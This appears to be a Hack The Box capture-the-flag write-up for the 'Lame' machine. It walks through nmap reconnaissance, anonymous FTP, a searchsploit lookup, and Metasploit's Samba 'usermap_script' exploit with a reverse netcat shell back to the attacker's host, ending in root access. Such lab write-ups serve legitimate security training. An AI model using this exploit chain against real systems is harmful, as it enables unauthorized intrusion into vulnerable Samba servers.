# Lame 

## Nmap Scanning

```

sudo nmap -sS -sC 10.10.10.3

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-03 05:46 EDT
Nmap scan report for 10.10.10.3
Host is up (0.41s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE
21/tcp  open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.195
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_clock-skew: mean: 2h04m44s, deviation: 2h49m44s, median: 4m42s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-07-03T05:52:13-04:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Nmap done: 1 IP address (1 host up) scanned in 76.73 seconds
```

## FTP 

```

ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.

ftp> passive
Passive mode on.
ftp> dir
227 Entering Passive Mode (10,10,10,3,48,187).
150 Here comes the directory listing.
226 Directory send OK.
ftp> 
```

didn't get anything in ftp, let's go for smb

## SMB

`searchsploit for smb`

```

searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                   | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                         | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                    | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                            | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

using `Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)` in metasploit


## Metasploit

```

search samba user

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  exploit/unix/webapp/citrix_access_gateway_exec       2010-12-21       excellent  Yes    Citrix Access Gateway Command Execution
   1  exploit/windows/smb/group_policy_startup             2015-01-26       manual     No     Group Policy Script Execution From Shared Resource
   2  exploit/unix/http/quest_kace_systems_management_rce  2018-05-31       excellent  Yes    Quest KACE Systems Management Command Injection
   3  exploit/multi/samba/usermap_script                   2007-05-14       excellent  No     Samba "username map script" Command Execution
   4  exploit/linux/samba/setinfopolicy_heap               2012-04-10       normal     Yes    Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   5  exploit/linux/samba/chain_reply                      2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/samba/chain_reply

msf6 > use 3
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.43.111   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.16.195
lhost => 10.10.16.195
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.16.195:4444 
[*] Command shell session 1 opened (10.10.16.195:4444 -> 10.10.10.3:42040) at 2021-07-03 05:57:08 -0400
```

W got an uninteractive shell

lets use `shell` command to spawn an interactive shell

```

shell
[*] Trying to find binary(python) on target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary(bash) on target machine
[*] Found bash at /bin/bash
```



```

### root.txt

root@lame:/# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
********************************


### user.txt

root@lame:/root# cd /home
cd /home
root@lame:/home# ls
ls
ftp  makis  service  user
root@lame:/home# cd user
cd user
root@lame:/home/user# ls
ls
root@lame:/home/user# cd ../makis
cd ../makis
root@lame:/home/makis# ls
ls
user.txt
root@lame:/home/makis# cat user.txt
cat user.txt
**************************************
root@lame:/home/makis# 
```
